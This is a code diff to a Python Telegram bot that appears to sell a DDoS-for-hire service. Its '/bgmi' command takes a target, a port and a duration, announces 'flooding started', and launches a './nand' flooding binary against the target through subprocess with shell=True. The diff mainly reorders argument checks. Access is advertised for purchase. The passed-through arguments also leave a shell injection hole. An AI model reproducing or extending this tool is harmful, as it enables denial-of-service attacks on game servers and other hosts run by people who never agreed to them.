@@ -271,6 +271,13 @@ COOLDOWN_TIME =0
 @bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
     user_id = str(message.chat.id)
+    
+    command = message.text.split()
+    if len(command) != 4:
+        response = "❌ <b>ᴜsᴀɢᴇ ᴇʀʀᴏʀ:</b>\n\n✅ <b>ᴘʟᴇᴀsᴇ ᴜsᴇ:</b>\n<code>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>"
+        send_video_with_caption(message.chat.id, response)
+        return
+    
     if user_id in allowed_user_ids:
         if user_id not in admin_id:
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
@@ -279,18 +286,16 @@ def handle_attack(message):
                 return
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
-        command = message.text.split()
-        if len(command) == 4:
-            target, port, time = command[1], int(command[2]), int(command[3])
-            if time > 300:
-                response = "⚠️ | <b>ᴇʀʀᴏʀ:</b> ᴛɪᴍᴇ ɪɴᴛᴇʀᴠᴀʟ ᴍᴜsᴛ ʙᴇ ʟᴇss ᴛʜᴀɴ 300 sᴇᴄᴏɴᴅs. | ⚠️"
-                send_video_with_caption(message.chat.id, response)
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
+        target, port, time = command[1], int(command[2]), int(command[3])
+        if time > 300:
+            response = "⚠️ | <b>ᴇʀʀᴏʀ:</b> ᴛɪᴍᴇ ɪɴᴛᴇʀᴠᴀʟ ᴍᴜsᴛ ʙᴇ ʟᴇss ᴛʜᴀɴ 300 sᴇᴄᴏɴᴅs. | ⚠️"
+            send_video_with_caption(message.chat.id, response)
+        else:
+            record_command_logs(user_id, '/bgmi', target, port, time)
+            log_command(user_id, target, port, time)
 
-                # 🔥 **Attack Start Message**
-                start_message = f"""
+            # 🔥 **Attack Start Message**
+            start_message = f"""
 ┌───🚀 <b>ғʟᴏᴏᴅɪɴɢ sᴛᴀʀᴛᴇᴅ</b> 🚀───┐  
 
 🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
@@ -303,14 +308,14 @@ def handle_attack(message):
 
 <b>└────────────────────────┘</b>
 """
-                send_video_with_caption(message.chat.id, start_message)
+            send_video_with_caption(message.chat.id, start_message)
 
-                # **Attack Execution**
-                full_command = f"./nand {target} {port} {time}"
-                subprocess.run(full_command, shell=True)
+            # **Attack Execution**
+            full_command = f"./nand {target} {port} {time}"
+            subprocess.run(full_command, shell=True)
 
-                # 🎯 **Attack Finish Message**
-                finish_message = f"""
+            # 🎯 **Attack Finish Message**
+            finish_message = f"""
 ┌───✅ <b>ғʟᴏᴏᴅɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇ</b> ✅───┐  
 
 🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
@@ -324,11 +329,8 @@ def handle_attack(message):
 
 <b>└────────────────────────┘</b>
 """
-                send_video_with_caption(message.chat.id, finish_message)
+            send_video_with_caption(message.chat.id, finish_message)
 
-        else:
-            response = "📌 | <b>ᴜsᴀɢᴇ:</b> /bgmi <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> | 📌"
-            send_video_with_caption(message.chat.id, response)
     else:
         response = "❌ | <b>ᴀᴄᴄᴇss ᴇxᴘɪʀᴇᴅ ᴏʀ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ</b> | ❌\n\n⚠️ ʙᴜʏ ɪᴛ ғʀᴏᴍ @ShrutiMusicBot!"
         send_video_with_caption(message.chat.id, response)
